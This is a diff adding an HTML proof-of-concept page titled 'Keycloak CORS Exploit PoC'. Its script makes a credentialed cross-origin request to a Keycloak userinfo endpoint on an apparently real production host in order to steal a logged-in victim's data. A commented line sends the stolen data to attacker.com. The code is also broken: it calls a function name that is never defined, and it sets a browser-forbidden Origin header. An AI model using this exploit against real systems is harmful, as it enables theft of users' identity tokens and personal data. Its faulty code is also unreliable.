@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head><title>Keycloak CORS Exploit PoC</title></head>
+<body>
+<h2>Keycloak Token/Userinfo Theft PoC</h2>
+<pre id="output">Testing...</pre>
+
+<script>
+async function stealKeycloakData() {
+  const kc = 'https://prod-iam.mystore.com.sa';
+  
+  try {
+    // Steal realm configuration + userinfo (if logged in)
+    const userinfo = await fetch(`${kc}/realms/master/protocol/openid-connect/userinfo`, {
+      credentials: 'include',
+      headers: { 'Origin': 'https://evil.com' }
+    });
+    
+    const data = await userinfo.json();
+    document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+    
+    // In real attack: exfiltrate tokens
+    // fetch('https://attacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
+  } catch(e) {
+    document.getElementById('output').textContent = 'Error: ' + e.message;
+  }
+}
+
+stealData();
+</script>
+</body>
+</html>
